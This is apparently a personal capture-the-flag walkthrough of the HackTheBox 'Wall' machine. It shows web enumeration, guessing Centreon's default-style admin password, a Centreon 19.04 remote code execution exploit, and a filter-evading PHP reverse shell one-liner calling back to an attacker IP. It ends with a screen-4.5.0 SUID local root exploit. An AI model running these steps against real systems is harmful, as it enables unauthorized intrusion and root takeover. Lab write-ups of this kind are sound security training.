Enumerate with Nmap:
nmap -sC -sV -oA wall 10.10.10.157



Run dirb:
enumerate .php files
dirb http://10.10.10.157/ -x .php 

basic enumeration with common word list
dirb http://10.10.10.157/

---- Scanning URL: http://10.10.10.157/ ----
+ http://10.10.10.157/index.html (CODE:200|SIZE:10918)                                                                        
+ http://10.10.10.157/monitoring (CODE:401|SIZE:459)  





Capture call to /monitoring on burp
Replace GET verb with POST in repeater and take note of url in response:

HTTP/1.1 200 OK
Date: Thu, 28 Nov 2019 05:19:48 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Wed, 03 Jul 2019 22:47:23 GMT
ETag: "9a-58ccea50ba4c6-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 154
Connection: close
Content-Type: text/html

<h1>This page is not ready yet !</h1>
<h2>We should redirect you to the required page !</h2>

<meta http-equiv="refresh" content="0; URL='/centreon'" />





Navigate to /centreon based on the response above.  Get presented with auth form. 

Tried to brute force with Rock_You.txt using both Hydra and Burp sniper.  To no avail.  Looked up default Centreon creds.  Scoured forums.  Looked up common passwords.  Attempted the following curl by hand after looking up how to authenticate over the centreon api.
curl --request POST --url 10.10.10.157/centreon/api/index.php?action=authenticate -d "usernam
e=admin&password=password1"                                                                                                    
{"authToken":"h0ZncxKGai\/T592mP00tzQFObSJcUOgKPWVo1qrb3gw="}

Found "password1" using the following CNN article LOL
https://www.cnn.com/2019/04/22/uk/most-common-passwords-scli-gbr-intl/index.html





Lookup Centreon 19.04 in Searchsploit
Centreon 19.04  - Remote Code Execution | exploits/php/webapps/47069.py

Execute exploit
shotop@kali:~/Pentesting/HackTheBox/Boxes/wall/searchsploit$ python /usr/share/exploitdb/exploits/php/webapps/47069.py http://10.10.10.157/centreon admin password1 10.10.10.157 80
[+] Retrieving CSRF token to submit the login form


^^ above exploit never worked because I couldn't figure out a working reverse shell to use.  It did however create my poller.  

Needed a PHP reverse shell:
php${IFS}-r${IFS}'$s=fsockopen("10.10.14.12",1337);$proc=proc_open("/bin/sh",array(0=>$s,1=>$s,2=>$s),$pipes);'

Saved the above reverse shell script as a misc command in Centreon.  Applied that misc command to the Central poller created by the exploit.

Jumped to page 60602 in centreon per advice from reddit thread. 

On page 60602, you can test various actions that occur post polling, inluding running Misc scripts.  I executed a test to get the reverse shell above in the misc script i created above to fire, which it did. 

Once I had the shell, I wanted to stabalize it.  It was super janky at first. 

Stabalized reverse shell:
on victim
python -c "import pty; pty.spawn('/bin/bash')"

ctrl-z to jump back to local

on local: 
stty raw -echo
fg

back on victim:
export TERM=xterm




Find all user directories:
www-data@Wall:/$ find / -type d -name "user" 2>&1 | grep -v "Permission denied"
/run/user
/usr/src/linux-headers-4.15.0-54-generic/include/config/thermal/gov/user
/usr/src/linux-headers-4.15.0-54-generic/include/config/fw/loader/user
/usr/src/linux-headers-4.15.0-54-generic/include/config/test/user
/usr/src/linux-headers-4.15.0-54-generic/include/config/infiniband/user
/usr/src/linux-headers-4.15.0-54-generic/include/config/user
/usr/src/linux-headers-4.15.0-54-generic/include/config/crypto/user
/usr/src/linux-headers-4.15.0-54-generic/include/config/have/perf/user
/usr/src/linux-headers-4.15.0-54-generic/include/config/have/user
/usr/src/linux-headers-4.15.0-54/tools/testing/selftests/user
/usr/lib/systemd/user
/etc/systemd/user
/proc/sys/user



Linux Enumeration

download LinEnum.sh file
https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
wget https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

make www directory in /wall on kali to store enum.sh file

in www directory, start python simple http server
python -m SimpleHTTPServer

on victim machine, wget linEnum file from http server on attacking machine
wget 10.10.14.12:8000/LinEnum.sh

update permissions on downloaded file
chmod +x LinEnum.sh


In retrospect, what I do next was revealed in the output of LinEnum.sh >> I'm still learning how to spot valuable information there. 



Search for binaries with suid bit set:
find / -perm -u=s -type f 2>/dev/null

A list comes back, but there is one, Screen, with a version number associated with it.  I thought that was odd, so I searched google for exploits against screen-4.5.0

Found this:
https://www.exploit-db.com/exploits/41154



Was able to get this onto the victim box using the python SimpleHTTP technique described above.  When i ran it, it looked like it errored out in a bunch of places, but sure enough, when it got to the end, I was sitting in a root shell.  

# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data),6000(centreon)


From here I was able to get access to the user/shelby directory to get the user.txt file as well /root to get the root flag. 
